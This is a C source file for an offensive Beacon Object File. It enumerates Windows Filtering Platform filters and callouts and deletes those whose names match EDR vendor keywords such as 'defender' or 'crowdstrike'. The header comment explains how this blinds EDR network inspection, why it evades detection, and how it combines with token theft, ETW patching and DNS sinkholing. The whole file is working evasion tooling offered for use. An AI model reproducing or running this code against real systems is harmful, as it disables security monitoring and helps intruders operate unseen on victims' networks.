/*
 * wfp_filter_purge.bof.c — Beacon Object File
 *
 * PURPOSE
 * -------
 * Enumerate and delete Windows Filtering Platform (WFP) filters registered
 * by EDR products using the documented user-mode WFP management API.
 *
 * WHY THIS WORKS — THE COMMON MISCONCEPTION
 * ------------------------------------------
 * Defenders (and many red teamers) think WFP filter manipulation requires
 * a kernel driver. This is WRONG.
 *
 * WFP has two layers:
 *
 *   KERNEL LAYER — FWPS (Filter and Weighting Platform Shim)
 *     fwpkclnt.sys — kernel-mode API for callout registration
 *     These ARE kernel-only. You need a driver to call FwpsCalloutRegister.
 *
 *   MANAGEMENT LAYER — FWPM (Filter and Weighting Platform Management)
 *     fwpuclnt.dll — USER-MODE management API, fully documented by Microsoft
 *     FwpmFilterAdd0, FwpmFilterDeleteById0, FwpmCalloutDeleteByKey0
 *     This is how Windows Firewall MMC snap-in, netsh, and PowerShell
 *     Get-NetFirewallRule all work. No driver needed.
 *
 * The management layer talks to the FWPM service (Base Filtering Engine,
 * BFE) via a documented local RPC channel. BFE runs as SYSTEM and manages
 * the authoritative WFP database. When we delete a filter, BFE notifies the
 * kernel to remove it from the active match table.
 *
 * HOW EDR USES WFP
 * -----------------
 * EDR products (MDE, Symantec, CrowdStrike Deep Packet Inspection module,
 * Carbon Black, etc.) register:
 *
 *   FwpmProviderAdd0    — register their vendor identity
 *   FwpmCalloutAdd0     — register a callout (links to kernel FWPS callout)
 *   FwpmFilterAdd0      — add filter rules that INVOKE the callout
 *
 * The filter is the rule: "for connections matching condition X, invoke
 * callout Y." Without the filter, the callout is never invoked — network
 * traffic flows uninspected regardless of whether the kernel FWPS callout
 * still exists.
 *
 * ATTACK
 * ------
 * Mode 0 (list): Enumerate all FWPM filters. Print filterId and name.
 *                Use this to audit the environment before purging.
 *
 * Mode 1 (purge): Delete filters whose displayData.name matches a user-
 *                 supplied keyword (e.g., "defender", "crowdstrike", "sense").
 *                 Mode 1 also attempts to delete matching callout entries.
 *
 * EFFECT
 * ------
 * After deleting EDR WFP filters:
 *   - EDR callout functions are no longer invoked for new connections
 *   - EDR cannot log connection metadata, inspect TLS SNI, or block traffic
 *   - Windows Firewall rules are UNAFFECTED (different provider namespace)
 *   - The EDR kernel driver's FWPS callout still exists (kernel memory),
 *     but is never called — it's now dead code consuming kernel memory only
 *
 * DETECTION PROFILE
 * -----------------
 * - The WFP management API is used by every network admin tool
 * - FwpmFilterDeleteById0 is indistinguishable from firewall rule management
 * - BFE logs filter adds/deletes to its own audit log, but EDR would need
 *   to monitor BFE audit events specifically (few do this in real deployments)
 * - Only artifact: missing filter entry in FwpmFilterEnum0 (detectable by
 *   EDR self-integrity check, rare)
 *
 * PRIVILEGE REQUIREMENT
 * ----------------------
 * FwpmEngineOpen0 + FwpmFilterDeleteById0 require that the calling process
 * have FWP_ACTRL_MANAGE rights on the filter engine — effectively local Admin.
 * SYSTEM is sufficient and works with our winlogon token theft pattern.
 *
 * COMPILATION
 *   MSVC: cl /c /TC /GS- /Fowfp_filter_purge.x64.obj wfp_filter_purge.bof.c
 *         Requires Windows SDK (for fwpmu.h / fwptypes.h).
 *         SDK path: C:\Program Files (x86)\Windows Kits\10\Include\<ver>\um\
 *   mingw: Requires manually copying fwpmu.h + fwptypes.h from SDK to include path.
 *          x86_64-w64-mingw32-gcc -o wfp_filter_purge.x64.o -c wfp_filter_purge.bof.c \
 *                                  -I"C:\WinSDK\include\um"
 */

#ifdef __cplusplus
#error "Compile as C, not C++: use  gcc -c  or  cl /TC"
#endif

#include <windows.h>
#include <fwpmu.h>
#include "beacon.h"

/* ─── Dynamic imports from fwpuclnt.dll ──────────────────────────────────── */
DECLSPEC_IMPORT DWORD WINAPI FWPUCLNT$FwpmEngineOpen0(
    const wchar_t*, UINT32, void*, void*, HANDLE*);
DECLSPEC_IMPORT DWORD WINAPI FWPUCLNT$FwpmEngineClose0(
    HANDLE);
DECLSPEC_IMPORT DWORD WINAPI FWPUCLNT$FwpmFilterCreateEnumHandle0(
    HANDLE, const FWPM_FILTER_ENUM_TEMPLATE0*, HANDLE*);
DECLSPEC_IMPORT DWORD WINAPI FWPUCLNT$FwpmFilterEnum0(
    HANDLE, HANDLE, UINT32, FWPM_FILTER0***, UINT32*);
DECLSPEC_IMPORT DWORD WINAPI FWPUCLNT$FwpmFilterDestroyEnumHandle0(
    HANDLE, HANDLE);
DECLSPEC_IMPORT DWORD WINAPI FWPUCLNT$FwpmFilterDeleteById0(
    HANDLE, UINT64);
DECLSPEC_IMPORT DWORD WINAPI FWPUCLNT$FwpmCalloutCreateEnumHandle0(
    HANDLE, const FWPM_CALLOUT_ENUM_TEMPLATE0*, HANDLE*);
DECLSPEC_IMPORT DWORD WINAPI FWPUCLNT$FwpmCalloutEnum0(
    HANDLE, HANDLE, UINT32, FWPM_CALLOUT0***, UINT32*);
DECLSPEC_IMPORT DWORD WINAPI FWPUCLNT$FwpmCalloutDestroyEnumHandle0(
    HANDLE, HANDLE);
DECLSPEC_IMPORT DWORD WINAPI FWPUCLNT$FwpmCalloutDeleteByKey0(
    HANDLE, const GUID*);
DECLSPEC_IMPORT void  WINAPI FWPUCLNT$FwpmFreeMemory0(
    void**);

/* ─── Additional imports ─────────────────────────────────────────────────── */
DECLSPEC_IMPORT void* WINAPI KERNEL32$RtlMoveMemory(void*, const void*, SIZE_T);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetLastError(void);

/* ─── Helpers ────────────────────────────────────────────────────────────── */

static void ZeroMem(void* p, SIZE_T n) {
    volatile char* v = (volatile char*)p;
    SIZE_T i;
    for (i = 0; i < n; i++) v[i] = 0;
}

/* Case-insensitive wide string search — does haystack contain needle? */
static BOOL WContainsI(const wchar_t* haystack, const wchar_t* needle) {
    if (!haystack || !needle || !needle[0]) return FALSE;
    const wchar_t* h = haystack;
    while (*h) {
        const wchar_t* hi = h;
        const wchar_t* ni = needle;
        while (*hi && *ni) {
            wchar_t ch = (*hi >= L'A' && *hi <= L'Z') ? (wchar_t)(*hi + 32) : *hi;
            wchar_t cn = (*ni >= L'A' && *ni <= L'Z') ? (wchar_t)(*ni + 32) : *ni;
            if (ch != cn) break;
            hi++; ni++;
        }
        if (!*ni) return TRUE;  /* needle exhausted — found */
        h++;
    }
    return FALSE;
}

/* Convert narrow arg string (from bof_pack "Z") to wide for comparison.
 * Max 256 chars. Returns static buffer — only one live at a time.        */
static void NarrowToWide(const char* src, wchar_t* dst, int maxLen) {
    int i;
    for (i = 0; src[i] && i < maxLen - 1; i++) dst[i] = (wchar_t)(unsigned char)src[i];
    dst[i] = L'\0';
}

/* ─── Filter operations ──────────────────────────────────────────────────── */

static void ListFilters(HANDLE hEngine) {
    HANDLE hEnum = NULL;
    DWORD ret = FWPUCLNT$FwpmFilterCreateEnumHandle0(hEngine, NULL, &hEnum);
    if (ret != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR,
            "  [!] FwpmFilterCreateEnumHandle0 failed: 0x%08X\n", ret);
        return;
    }

    FWPM_FILTER0** entries = NULL;
    UINT32 count = 0;
    int total = 0;

    for (;;) {
        ret = FWPUCLNT$FwpmFilterEnum0(hEngine, hEnum, 512, &entries, &count);
        if (ret != ERROR_SUCCESS || count == 0) break;

        for (UINT32 i = 0; i < count; i++) {
            FWPM_FILTER0* f = entries[i];
            const wchar_t* name = (f->displayData.name) ? f->displayData.name : L"<unnamed>";
            BeaconPrintf(CALLBACK_OUTPUT,
                "  [%4u] id=0x%016llX  %S\n",
                total + i, (unsigned long long)f->filterId, name);
        }
        total += (int)count;
        FWPUCLNT$FwpmFreeMemory0((void**)&entries);

        if (count < 512) break;  /* last page */
    }

    FWPUCLNT$FwpmFilterDestroyEnumHandle0(hEngine, hEnum);
    BeaconPrintf(CALLBACK_OUTPUT, "  Total: %d filter(s)\n", total);
}

static void ListCallouts(HANDLE hEngine) {
    HANDLE hEnum = NULL;
    DWORD ret = FWPUCLNT$FwpmCalloutCreateEnumHandle0(hEngine, NULL, &hEnum);
    if (ret != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR,
            "  [!] FwpmCalloutCreateEnumHandle0 failed: 0x%08X\n", ret);
        return;
    }

    FWPM_CALLOUT0** entries = NULL;
    UINT32 count = 0;
    int total = 0;

    for (;;) {
        ret = FWPUCLNT$FwpmCalloutEnum0(hEngine, hEnum, 256, &entries, &count);
        if (ret != ERROR_SUCCESS || count == 0) break;

        for (UINT32 i = 0; i < count; i++) {
            FWPM_CALLOUT0* c = entries[i];
            const wchar_t* name = (c->displayData.name) ? c->displayData.name : L"<unnamed>";
            BeaconPrintf(CALLBACK_OUTPUT,
                "  [%4u] calloutId=%u  %S\n",
                total + i, c->calloutId, name);
        }
        total += (int)count;
        FWPUCLNT$FwpmFreeMemory0((void**)&entries);

        if (count < 256) break;
    }

    FWPUCLNT$FwpmCalloutDestroyEnumHandle0(hEngine, hEnum);
    BeaconPrintf(CALLBACK_OUTPUT, "  Total: %d callout(s)\n", total);
}

static void PurgeFilters(HANDLE hEngine, const wchar_t* keyword) {
    HANDLE hEnum = NULL;
    DWORD ret = FWPUCLNT$FwpmFilterCreateEnumHandle0(hEngine, NULL, &hEnum);
    if (ret != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR,
            "  [!] FwpmFilterCreateEnumHandle0 failed: 0x%08X\n", ret);
        return;
    }

    FWPM_FILTER0** entries = NULL;
    UINT32 count = 0;
    int deleted = 0, skipped = 0, failed = 0;

    /* Collect matching filter IDs first (can't delete while enumerating) */
    UINT64 matchIds[1024];
    int matchCount = 0;

    for (;;) {
        ret = FWPUCLNT$FwpmFilterEnum0(hEngine, hEnum, 512, &entries, &count);
        if (ret != ERROR_SUCCESS || count == 0) break;

        for (UINT32 i = 0; i < count; i++) {
            FWPM_FILTER0* f = entries[i];
            const wchar_t* name = (f->displayData.name) ? f->displayData.name : L"";
            const wchar_t* desc = (f->displayData.description) ? f->displayData.description : L"";

            if (WContainsI(name, keyword) || WContainsI(desc, keyword)) {
                if (matchCount < 1024) {
                    matchIds[matchCount++] = f->filterId;
                    BeaconPrintf(CALLBACK_OUTPUT,
                        "  [MATCH] id=0x%016llX  %S\n",
                        (unsigned long long)f->filterId, name);
                }
            } else {
                skipped++;
            }
        }
        FWPUCLNT$FwpmFreeMemory0((void**)&entries);
        if (count < 512) break;
    }
    FWPUCLNT$FwpmFilterDestroyEnumHandle0(hEngine, hEnum);

    if (matchCount == 0) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "  No filters matched keyword '%S'\n", keyword);
        return;
    }

    /* Delete matched filters */
    for (int i = 0; i < matchCount; i++) {
        ret = FWPUCLNT$FwpmFilterDeleteById0(hEngine, matchIds[i]);
        if (ret == ERROR_SUCCESS) {
            deleted++;
        } else if (ret == FWP_E_IN_USE) {
            BeaconPrintf(CALLBACK_ERROR,
                "  [!] id=0x%016llX — FWP_E_IN_USE (filter active in a transaction)\n",
                (unsigned long long)matchIds[i]);
            failed++;
        } else {
            BeaconPrintf(CALLBACK_ERROR,
                "  [!] id=0x%016llX — delete failed: 0x%08X\n",
                (unsigned long long)matchIds[i], ret);
            failed++;
        }
    }

    BeaconPrintf((deleted > 0) ? CALLBACK_OUTPUT : CALLBACK_ERROR,
        "\n  RESULT: %d/%d filter(s) deleted  (%d failed, %d not matched)\n",
        deleted, matchCount, failed, skipped);
}

static void PurgeCallouts(HANDLE hEngine, const wchar_t* keyword) {
    HANDLE hEnum = NULL;
    DWORD ret = FWPUCLNT$FwpmCalloutCreateEnumHandle0(hEngine, NULL, &hEnum);
    if (ret != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR,
            "  [!] FwpmCalloutCreateEnumHandle0 failed: 0x%08X\n", ret);
        return;
    }

    FWPM_CALLOUT0** entries = NULL;
    UINT32 count = 0;
    GUID matchKeys[256];
    int matchCount = 0;

    for (;;) {
        ret = FWPUCLNT$FwpmCalloutEnum0(hEngine, hEnum, 256, &entries, &count);
        if (ret != ERROR_SUCCESS || count == 0) break;

        for (UINT32 i = 0; i < count; i++) {
            FWPM_CALLOUT0* c = entries[i];
            const wchar_t* name = (c->displayData.name) ? c->displayData.name : L"";
            const wchar_t* desc = (c->displayData.description) ? c->displayData.description : L"";

            if (WContainsI(name, keyword) || WContainsI(desc, keyword)) {
                if (matchCount < 256) {
                    KERNEL32$RtlMoveMemory(&matchKeys[matchCount], &c->calloutKey, sizeof(GUID));
                    matchCount++;
                    BeaconPrintf(CALLBACK_OUTPUT,
                        "  [MATCH callout] id=%u  %S\n", c->calloutId, name);
                }
            }
        }
        FWPUCLNT$FwpmFreeMemory0((void**)&entries);
        if (count < 256) break;
    }
    FWPUCLNT$FwpmCalloutDestroyEnumHandle0(hEngine, hEnum);

    int deleted = 0, failed = 0;
    for (int i = 0; i < matchCount; i++) {
        ret = FWPUCLNT$FwpmCalloutDeleteByKey0(hEngine, &matchKeys[i]);
        if (ret == ERROR_SUCCESS) {
            deleted++;
        } else {
            BeaconPrintf(CALLBACK_ERROR,
                "  [!] callout delete failed: 0x%08X\n", ret);
            failed++;
        }
    }

    if (matchCount > 0) {
        BeaconPrintf((deleted > 0) ? CALLBACK_OUTPUT : CALLBACK_ERROR,
            "  Callouts: %d/%d deleted\n", deleted, matchCount);
    }
}

/* ═══════════════════════════════════════════════════════════════════════════
 * BOF ENTRY POINT
 * ═══════════════════════════════════════════════════════════════════════════ */

/*
 * Argument format (packed by CNA with bof_pack("iz", mode, keyword)):
 *
 *   [int32]  mode
 *     0 = LIST:  enumerate all WFP filters and callouts (read-only)
 *     1 = PURGE: delete filters+callouts whose name contains keyword
 *
 *   [string z] keyword
 *     Case-insensitive substring to match filter/callout names.
 *     Common values: "defender", "sense", "crowdstrike", "carbon", "sentinel"
 *     Ignored in mode 0.
 *
 * Privilege requirement: Local Administrator (FWP_ACTRL_MANAGE on engine).
 * SYSTEM (from etw_tamper winlogon theft) works.
 */
void go(char* args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);

    LONG mode    = BeaconDataInt(&parser);
    int  kwBytes = 0;
    char* kwRaw  = BeaconDataExtract(&parser, &kwBytes);

    wchar_t keyword[256];
    ZeroMem(keyword, sizeof(keyword));
    if (kwRaw && kwBytes > 0) {
        NarrowToWide(kwRaw, keyword, 256);
    }

    /* Open local WFP engine — RPC_C_AUTHN_DEFAULT = 0xFFFFFFFF */
    HANDLE hEngine = NULL;
    DWORD ret = FWPUCLNT$FwpmEngineOpen0(NULL, 0xFFFFFFFF, NULL, NULL, &hEngine);
    if (ret != ERROR_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR,
            "[!] FwpmEngineOpen0 failed: 0x%08X\n"
            "    Requires local Administrator rights.\n"
            "    If running as admin and still failing, BFE service may be stopped.\n", ret);
        return;
    }

    if (mode == 0) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[*] WFP Filter Purge: LISTING all filters\n");
        ListFilters(hEngine);
        BeaconPrintf(CALLBACK_OUTPUT,
            "[*] WFP Filter Purge: LISTING all callouts\n");
        ListCallouts(hEngine);
        BeaconPrintf(CALLBACK_OUTPUT,
            "\n    Use 'wfp_filter_purge purge <keyword>' to delete matching entries\n"
            "    Examples: purge defender / purge crowdstrike / purge sense\n");
    } else {
        if (!keyword[0]) {
            BeaconPrintf(CALLBACK_ERROR,
                "[!] Mode 1 (purge) requires a keyword argument.\n"
                "    Usage: wfp_filter_purge purge <keyword>\n");
            FWPUCLNT$FwpmEngineClose0(hEngine);
            return;
        }
        BeaconPrintf(CALLBACK_OUTPUT,
            "[*] WFP Filter Purge: PURGING filters/callouts matching '%S'...\n"
            "    After deletion:\n"
            "    - EDR callout NOT invoked for new network connections\n"
            "    - EDR cannot log connection metadata or inspect TLS SNI\n"
            "    - EDR cannot block connections via WFP policy\n",
            keyword);

        BeaconPrintf(CALLBACK_OUTPUT, "  -- Filters --\n");
        PurgeFilters(hEngine, keyword);

        BeaconPrintf(CALLBACK_OUTPUT, "  -- Callouts --\n");
        PurgeCallouts(hEngine, keyword);

        BeaconPrintf(CALLBACK_OUTPUT,
            "\n[*] Combine with: nrpt_sinkhole (DNS), null_route (IP), "
            "etwpatch (per-process ETW)\n");
    }

    FWPUCLNT$FwpmEngineClose0(hEngine);
}
